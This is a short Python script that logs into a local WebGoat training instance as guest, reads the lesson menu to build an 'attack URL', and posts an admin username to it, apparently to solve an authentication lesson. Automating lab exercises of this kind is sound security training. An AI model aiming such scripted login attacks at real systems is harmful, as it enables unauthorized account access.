import requests
import json

url = "http://127.0.0.1:8080/WebGoat"
url1 = url + "/start.mvc"
lessonURL = url + "/service/lessonmenu.mvc"

headers = headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36'
}
payload = dict(username='guest', password='guest')
s = requests.Session()
s.get(url)
s.post(url + "/j_spring_security_check;jsessionid=" + s.cookies.get('JSESSIONID'),data=payload, headers = headers)
r = s.get(url1)
print r.content
r1 = s.get(lessonURL) #contains screen# and menu# for attack URL

parsed_json = json.loads(r1.content)

attackURL = url  + "/"  + parsed_json[4]['children'][1]['link']


print "\n\n" + attackURL + "\n\n"

r2 = s.get(attackURL)
some = {"Username": "admin"}
r2 = s.post(attackURL, data=some)

print r2.text
print "Halelluah!!!"
